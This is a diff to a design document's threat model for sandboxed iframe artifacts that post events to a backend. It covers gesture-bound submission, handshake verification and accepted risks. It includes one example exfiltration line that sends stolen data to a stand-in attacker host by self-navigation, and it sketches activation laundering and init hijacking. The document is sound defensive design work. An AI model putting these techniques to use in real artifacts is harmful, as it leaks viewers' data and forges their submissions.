@@ -229,20 +229,41 @@ the threat model:
 - **Write path (artifact → backend).** The sandbox and `connect-src 'none'`
   still block every direct network path; nothing here loosens them. The
   artifact can only dispatch `CustomEvent('primer:submit-events')`; the
-  companion forwards it over the MessagePort **only from within the same
-  trusted event dispatch that carried a user gesture**, consuming the
-  activation (one gesture = one submission). Checking
-  `navigator.userActivation.isActive` alone is explicitly NOT sufficient — a
-  malicious artifact could defer its dispatch into the activation window of
-  an unrelated click, degrading "the reviewer tapped Send" to "the reviewer
-  tapped anything" (silent injection into a consumer's work queue under the
-  viewer's name). An artifact is untrusted code running in every viewer's
-  browser, regardless of what produced it. The parent page remains the sole
-  authed principal: it re-validates the batch and POSTs it; the server
-  validates again and stamps the authenticated user as the row author —
-  attribution can never be asserted from inside the iframe. Writes require
-  the caller to be a document collaborator (owner included); external-share
-  and public viewers cannot authenticate to these routes at all.
+  companion forwards it over the MessagePort only when BOTH hold: the
+  dispatch happens **synchronously inside a trusted gesture-event dispatch**,
+  AND the current **physical activation cluster** is unconsumed — where one
+  cluster spans the whole trusted-event burst of one physical interaction
+  (pointer + mouse + touch + compatibility-mouse events of one tap; a
+  keydown-through-keyup keystroke, auto-repeat included). A successful
+  forward consumes the cluster, so **one physical activation authorizes at
+  most one submission** — an artifact with handlers on every gesture event
+  type still cannot turn one incidental tap into several attributed
+  submissions. Checking `navigator.userActivation.isActive` alone is
+  explicitly NOT sufficient — a malicious artifact could defer its dispatch
+  into the activation window of an unrelated click (activation laundering);
+  the in-dispatch condition closes that. An artifact is untrusted code
+  running in every viewer's browser, regardless of what produced it. The
+  parent page remains the sole authed principal: it re-validates the batch
+  and POSTs it; the server validates again and stamps the authenticated user
+  as the row author — attribution can never be asserted from inside the
+  iframe. Writes require the caller to be a document collaborator (owner
+  included); external-share and public viewers cannot authenticate to these
+  routes at all.
+
+- **ACCEPTED RISK (pending ruling) — element-level intent is not
+  attestable.** The consent gate's guarantee is per physical activation, not
+  per "Send button": because the submit affordance lives INSIDE the
+  untrusted artifact, the companion cannot distinguish "the reviewer tapped
+  Send" from "the reviewer tapped anything" when the artifact registers a
+  handler on an arbitrary element and submits synchronously within that
+  interaction's dispatch. The fix above caps the damage at one attributed
+  submission per physical interaction; fully closing the residual would
+  require a **parent-owned trusted submit affordance** (the confirm/send UI
+  rendered outside the iframe) — a contract change deliberately NOT made
+  here; it is the document owner's call. Until then: a hostile artifact can
+  convert each incidental interaction inside its viewport into at most one
+  reviewer-attributed event batch, subject to server-side validation, the
+  batch/payload caps, and full audit attribution.
 
 - **`artifact` audience tier (backend → artifact).** Every event row carries
   a required `audience` (`author` | `collaborators` | `artifact`); the
@@ -260,6 +281,44 @@ the threat model:
   as feedback to reason about, never commands. This is what keeps a
   compromised artifact — or a hostile collaborator's writes — from becoming
   a command channel into consumers.
+
+- **Init handshake is parent-verified.** The companion's init is
+  first-init-wins, so it accepts the handshake message only from the
+  embedding parent frame (`event.source === window.parent` when actually
+  embedded). Without that check the artifact's own JS could post a fake
+  init to its own window and hijack the companion port before the real
+  parent's arrives — a self-DoS plus a fake "parent" feeding the artifact
+  fabricated event rows.
+
+- **Email enumeration on user lookup.** `GET /api/users/lookup?email=`
+  answers 200/404 by whether an org account exists — an authenticated
+  caller can probe addresses. Accepted: the surface is org-authenticated
+  only (same posture as `/api/users` typeahead, which already returns
+  names and emails to any org member), and the id space it reveals is what
+  event attribution requires.
+
+- **Per-connection / per-page memory grows with the stream.** The SSE
+  handler's sent-ids set and the parent page's relayed-rows buffer grow with
+  the document's event count (retention is forever). Accepted for v1: both
+  are bounded by a single document's stream length and by the connection /
+  page lifetime; revisit if any document's stream reaches a size where this
+  matters.
+
+- **Navigation is an exfil channel the CSP does not close (pre-existing).**
+  `connect-src 'none'` blocks fetch/XHR/WebSocket and `form-action 'none'`
+  kills native form submission, but nothing blocks the artifact from
+  navigating ITSELF (`location.href = 'https://attacker/?stolen=…'`) —
+  sandboxed iframes may self-navigate without any sandbox token, and the
+  upload pipeline only strips `<meta refresh>`, not scripted navigation.
+  Any data present inside the iframe — the artifact's own content, and now
+  `artifact`-audience event rows relayed in — is therefore exfiltratable by
+  a hostile artifact to a URL of its choosing. Not widened by the events
+  feature in kind (comment anchors and document content were already
+  inside), but widened in value: authors choose `audience: 'artifact'`
+  knowing those rows enter this trust domain. Mitigation options if ever
+  needed: a `navigate-to`-style policy is not implementable today; an
+  interstitial via sandbox navigation restrictions would break legitimate
+  in-artifact links, so this stands as an accepted, documented risk.
 
 ### Anchor resolution & drift handling
 
